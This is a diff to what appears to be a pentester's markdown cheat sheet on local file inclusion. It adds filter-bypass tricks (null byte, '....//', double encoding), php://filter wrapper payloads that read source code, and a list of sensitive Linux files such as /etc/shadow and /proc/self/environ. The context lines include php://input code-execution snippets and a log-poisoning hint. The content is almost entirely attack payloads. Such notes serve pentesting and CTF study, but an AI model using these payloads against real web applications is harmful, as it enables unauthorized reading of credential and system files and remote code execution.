@@ -12,13 +12,13 @@ dotdotpwn -h IP -m MODE -f FILE-TO-FUZZ -U USER -P PASS
 
 NOTE: **Read the file that is running LFI** to get more information about the code.
 
-```bash
-# using null byte %00
-/etc/passwd%00
+* Bypassing filters using `....//`
+* Using null byte %00: `/etc/passwd%00`
+* URL encoding techniques (double encoding)
 
-# LFI wordlist
-/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt
-```
+### LFI wordlist
+
+* `/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt`
 
 ## .php wrappers
 
@@ -37,7 +37,9 @@ file=php://input
 # needs to send POST data
 <?php system('id'); ?> | <?php shell_exec('id'); ?>
 
-# filter wrapper
+# filter wrappers
+file=php://filter/resource=PHP-FILE
+file=filter/read=string.rot13/resource=PHP-FILE
 file=php://filter/convert.base64-encode/resource=PHP-FILE
 ```
 
@@ -51,10 +53,25 @@ LFI=/proc/self/fd/{NUMBER}
 # once have access to log file > log-poisoning.
 ```
 
+## LFI Paths (linux)
+
+```bash
+/etc/issue
+/etc/passwd
+/etc/shadow
+/etc/group
+/etc/hosts
+/etc/motd
+/etc/mysql/my.cnf
+/proc/PID_NUMBER/fd/FILE_DESCRIPTOR_NUMBER
+/proc/self/environ
+/proc/version
+/proc/cmdline
+```
+
 ## LFI Paths (windows)
 
 ```bash
-# sample paths to test
 C:\Windows\System32\Drivers\etc\hosts
 C:\\Windows\\System32\\Drivers\\etc\\hosts
 \Windows\System32\Drivers\etc\hosts
